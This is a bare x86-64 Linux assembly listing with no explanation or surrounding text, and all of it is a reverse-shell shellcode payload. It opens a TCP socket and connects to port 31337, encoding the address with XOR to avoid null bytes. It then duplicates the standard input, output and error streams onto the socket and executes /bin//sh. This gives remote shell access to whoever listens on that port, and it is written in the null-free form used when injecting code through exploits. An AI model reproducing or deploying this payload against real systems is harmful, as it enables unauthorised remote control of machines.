
	.section .text
	.globl	_start

_start:

	xorl	%eax,%eax
	movb	$0x29,%al
	xorl	%edi,%edi
	movb	$2,%dil
	xorl	%esi,%esi
	incl	%esi
	xorl	%edx,%edx
	syscall

	pushq	%rax

	xorl	%eax,%eax
	pushq	%rax
	movl	$0x697afffd,%eax
	xorw	$0xffff,%ax
	pushq	%rax

	xorl	%eax,%eax
	movb	$0x2a,%al
	movl	0x10(%rsp),%edi
	movq	%rsp,%rsi
	xorl	%edx,%edx
	movb	$0x10,%dl
	syscall

	xorl	%eax,%eax
	pushq	%rax
	jmp	.L0
.L1:
	xorl	%eax,%eax
	movb	$0x21,%al
	movl	0x18(%rsp),%edi
	movl	(%rsp),%esi
	syscall
	incl	(%rsp)
.L0:
	cmpb	$3,(%rsp)
	jl	.L1

	xorl	%eax,%eax
	pushq	%rax
	movq	$0x68732f2f6e69622f,%rdx
	pushq	%rdx
	movq	%rsp,%rdi
	pushq	%rax
	movq	%rsp,%rdx
	pushq	%rdi
	movq	%rsp,%rsi
	movb	$0x3b,%al
	syscall

